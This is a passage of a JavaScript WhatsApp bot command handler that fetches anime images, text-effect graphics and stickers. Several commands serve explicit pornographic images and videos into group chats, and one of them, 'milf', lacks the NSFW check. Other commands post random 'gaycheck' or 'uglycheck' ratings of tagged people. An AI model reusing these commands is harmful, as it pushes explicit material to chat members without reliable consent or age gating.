            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehighfive':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecringe':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animedance':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehappy':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeglomp':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmug':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeblush':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewave':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmile':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepoke':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewink':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebonk':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebully':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeyeet':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebite':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animelick':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekill':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecry':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewlp':{
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekiss':{
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehug':{
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeneko':{
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepat':{
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeslap':{
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecuddle':{
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewaifu':{
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animenom':{
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefoxgirl':{
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await DeepakBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animetickle': {
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await DeepakBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animegecg': {
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await DeepakBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'dogwoof': {
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await DeepakBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '8ballpool': {
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await DeepakBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'goosebird': {
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await DeepakBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefeed': {
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await DeepakBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeavatar': {
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await DeepakBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'lizardpic': {
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await DeepakBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'catmeow': {
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await DeepakBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'anime': {
if (!text) return replygcdeepak(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
await DeepakStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygcdeepak(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
                await DeepakBotInc.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break
case 'hentaivid': case 'hentai': case 'hentaivideo': {
	if (!m.isGroup) return DeepakStickGroup()
if (!AntiNsfw) return replygcdeepak(mess.nsfw)
                await DeepakStickWait()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                DeepakBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return DeepakStickGroup()
if (!AntiNsfw) return replygcdeepak(mess.nsfw)
await DeepakStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return DeepakStickGroup()
if (!AntiNsfw) return replygcdeepak(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return DeepakStickGroup()
if (!AntiNsfw) return replygcdeepak(mess.nsfw)
await DeepakStickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return DeepakStickGroup()
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
await DeepakStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return DeepakStickGroup()
await DeepakStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return DeepakStickGroup()
if (!AntiNsfw) return replygcdeepak(mess.nsfw)
await DeepakStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await DeepakBotInc.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'blowjob':
if (!m.isGroup) return DeepakStickGroup()
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
await DeepakStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return DeepakStickGroup()
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
await DeepakStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return DeepakStickGroup()
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
await DeepakStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return DeepakStickGroup()
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
await DeepakStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return DeepakStickGroup()
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
await DeepakStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return DeepakStickGroup()
	if (!AntiNsfw) return replygcdeepak(mess.nsfw)
await DeepakStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
var deepakresult = pickRandom(ahegaonsfw)
DeepakBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: deepakresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return DeepakStickGroup()
if (!AntiNsfw) return replygcdeepak(mess.nsfw)
await DeepakStickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await DeepakBotInc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await DeepakBotInc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppdeepak= await getBuffer(ppuser)
DeepakBotInc.sendMessage(from, { image: ppdeepak, caption: profile, mentions: [bet]},{quoted:m})
break
case 'handsomecheck':
				if (!text) return replygcdeepak(`Tag Someone, Example : ${prefix + command} @Deepak`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
DeepakBotInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replygcdeepak(`Tag Someone, Example : ${prefix + command} @Deepak`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
DeepakBotInc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replygcdeepak(`Tag Someone, Example : ${prefix + command} @Deepak`)
					const deepak =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = deepak[Math.floor(Math.random() * deepak.length)]
					DeepakBotInc.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
				if (!text) return m.reply(`Tag Someone, Example : ${prefix + command} @Deepak`)
					const sangeh = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
DeepakBotInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${sange}%*` }, { quoted: m })
					break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await DeepakBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'telestick': {
	if (m.isGroup) return DeepakStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let deepakresources = await Telesticker(args[0])
		await replygcdeepak(`Sending ${deepakresources.length} stickers...`)
		if (m.isGroup && deepakresources.length > 30) {
			await replygcdeepak('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < deepakresources.length; i++) {
				DeepakBotInc.sendMessage(m.sender, { sticker: { url: deepakresources[i].url }})
			}
		} else {
			for (let i = 0; i < deepakresources.length; i++) {
				DeepakBotInc.sendMessage(m.chat, { sticker: { url: deepakresources[i].url }})
			}
		}
	} else replygcdeepak(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!q) return replygcdeepak(`Example : ${prefix+command} DeepakBotInc`) 
await DeepakStickWait()
const photooxy = require('./lib/photooxy')
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
DeepakBotInc.sendMessage(m.chat, { image: { url: dehe }, caption: mess.success}, { quoted: m })
}
break
case 'setcmd': {
                if (!m.quoted) return replygcdeepak('Reply Message!')
                if (!m.quoted.fileSha256) return replygcdeepak('SHA256 Hash Missing')
                if (!text) return replygcdeepak(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcdeepak('You have no permission to change this sticker command')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcdeepak(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcdeepak(`No hashes`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcdeepak('You have no permission to delete this sticker command')             
                delete global.db.data.sticker[hash]
                replygcdeepak(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
